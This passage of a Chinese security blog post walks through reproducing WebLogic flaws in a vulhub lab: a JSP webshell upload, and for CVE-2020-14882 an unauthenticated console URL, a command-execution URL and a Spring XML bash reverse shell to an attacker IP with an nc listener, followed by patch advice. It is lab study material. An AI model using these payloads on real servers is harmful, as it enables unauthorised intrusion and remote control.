<pre class="line-numbers language-none"><code class="language-none">http://192.168.80.133:7001/ws_utc/css/config/keystore/1640590531080_shell.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211227154226664.png" alt="image-20211227154226664"></p>
<p>尝试连接</p>
<p><img src="/2021/12/09/day36/image-20211227154258429.png" alt="image-20211227154258429"></p>
<p>可以看到连接成功</p>
<h5 id="begin-do页面"><a href="#begin-do页面" class="headerlink" title="begin.do页面"></a>begin.do页面</h5><p>接下来我们看看另一个页面begin.do</p>
<p>我们还是使用ws_utc应用的静态文件css目录</p>
<pre class="line-numbers language-none"><code class="language-none">http://192.168.80.133:7001/ws_utc/begin.do<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>输入刚才的账号密码，跳转到此页面</p>
<p><img src="/2021/12/09/day36/image-20211227154749801.png" alt="image-20211227154749801"></p>
<p>很轻易的发现右上角有个类似文件的东西，点击发现了上传点</p>
<p>上传后发现提示出错，我们f12 网络，在相应里可以找到一个上传路径</p>
<p><img src="/2021/12/09/day36/image-20211227155757908.png" alt="image-20211227155757908"></p>
<p>我们构造得到连接路径</p>
<p><img src="/2021/12/09/day36/image-20211227160039884.png" alt="image-20211227160039884"></p>
<pre class="line-numbers language-none"><code class="language-none">http://192.168.80.133:7001/ws_utc/css/upload/RS_Upload_2021-12-27_08-01-39_776/import_file_name_shell.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211227160506346.png" alt="image-20211227160506346"></p>
<h4 id="修复-29"><a href="#修复-29" class="headerlink" title="修复"></a>修复</h4><p>使用强密码</p>
<h3 id="远程代码执行漏洞-CVE-2020-14882"><a href="#远程代码执行漏洞-CVE-2020-14882" class="headerlink" title="远程代码执行漏洞(CVE-2020-14882)"></a>远程代码执行漏洞(CVE-2020-14882)</h3><h4 id="原理-28"><a href="#原理-28" class="headerlink" title="原理"></a>原理</h4><p>通过发送恶意的HTTP GET 请求，攻击者可在<strong>未经身份验证的情况下</strong>控制 WebLogic Server Console ，并执行任意代码。</p>
<p>影响版本：</p>
<p>Oracle Weblogic Server 10.3.6.0.0 </p>
<p>Oracle Weblogic Server 12.1.3.0.0 </p>
<p>Oracle Weblogic Server 12.2.1.3.0 </p>
<p>Oracle Weblogic Server 12.2.1.4.0 </p>
<p>Oracle Weblogic Server 14.1.1.0.0 </p>
<h4 id="复现-30"><a href="#复现-30" class="headerlink" title="复现"></a>复现</h4><p>进入路径下开启docker</p>
<pre class="line-numbers language-none"><code class="language-none">cd vulhub-master/weblogic/CVE-2020-14882
sudo docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>开启后访问</p>
<pre class="line-numbers language-none"><code class="language-none">http://192.168.80.133:7001/console/login/LoginForm.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211227162648120.png" alt="image-20211227162648120"></p>
<p>构造url进行未授权访问</p>
<pre class="line-numbers language-none"><code class="language-none">192.168.80.133:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=AppDeploymentsControlPage&amp;handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211227163137095.png" alt="image-20211227163137095"></p>
<p>可以看到进来了console，这里看到权限并不是很高，不能上传文件之类的</p>
<p>这里我们先测试一下，在/tmp下创建一个test文件</p>
<p>我们这里先进入到/tmp</p>
<pre class="line-numbers language-none"><code class="language-none">sudo docker exec -it cve202014882_weblogic_1 /bin/bash
ls /tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211227164108212.png" alt="image-20211227164108212"></p>
<p>构造url</p>
<pre class="line-numbers language-none"><code class="language-none">192.168.80.133:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch%20/tmp/test%27);%22);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里虽然404，但是命令执行了</p>
<p><img src="/2021/12/09/day36/image-20211227165535536.png" alt="image-20211227165535536"></p>
<p>接下来我们在kali创建一个xml文件，使用bash命令反弹shell</p>
<p>下面的ip换成kali的ip</p>
<pre class="line-numbers language-none"><code class="language-none">reverse-bash.xml 

&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
xsi:schemaLocation="http://www.springframework.org/schema/beans 
http://www.springframework.org/schema/beans/spring-beans.xsd"&gt; 
&lt;bean id="pb" class="java.lang.ProcessBuilder" init-method="start"&gt; 
&lt;constructor-arg&gt; 
&lt;list&gt; 
&lt;value&gt;/bin/bash&lt;/value&gt; 
&lt;value&gt;-c&lt;/value&gt; 
&lt;value&gt;&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/192.168.80.134/99990&gt;&amp;1]]&gt;&lt;/value&gt; 
&lt;/list&gt; 
&lt;/constructor-arg&gt; 
&lt;/bean&gt; 
&lt;/beans&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>监听9999端口</p>
<pre class="line-numbers language-none"><code class="language-none">nc -lvnp 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>构造url</p>
<pre class="line-numbers language-none"><code class="language-none">192.168.80.133:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://192.168.80.134/reverse-bash.xml")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211227171838797.png" alt="image-20211227171838797"></p>
<p>反弹出shell</p>
<h4 id="修复-30"><a href="#修复-30" class="headerlink" title="修复"></a>修复</h4><ol>
<li><p>打补丁</p>
<pre class="line-numbers language-none"><code class="language-none">https://www.oracle.com/security-alerts/cpuapr2020.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>但是该漏洞的补丁存在被绕过的风险，建议临时关闭后台/console/console.portal的对外访问。</p>
</li>
</ol>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">晓莎K</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://0x00xiaoshaK.github.io/2021/12/09/day36/">http://0x00xiaoshaK.github.io/2021/12/09/day36/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">晓莎K</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/">
                                    <span class="chip bg-color">中间件</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'DJnY4XDNchYmzLpD8IASjSjf-gzGzoHsz',
        appKey: '3tkas9StBY5fsrGt1BVtPNOt',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'true' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

<!--酷Q推送-->


    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2021/12/28/day37/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="windows提权">
                        
                        <span class="card-title">windows提权</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            windows提权
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2021-12-28
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E6%8F%90%E6%9D%83/" class="post-category">
                                    提权
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/windows%E6%8F%90%E6%9D%83/">
                        <span class="chip bg-color">windows提权</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2021/12/04/day35/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="网站后台getshell">
                        
                        <span class="card-title">网站后台getshell</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            网站后台getshell
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-04
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
                                    渗透测试
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0getshell/">
                        <span class="chip bg-color">网站后台getshell</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2021-2023</span>
            
            <a href="/about" target="_blank">晓莎K</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/0x00xiaoshaK" target="_blank">Matery</a>
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">219.7k</span>
            
            
            
            
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link ">
    <a href="https://github.com/0x00xiaoshaK" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1003682630@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1003682630" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1003682630" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
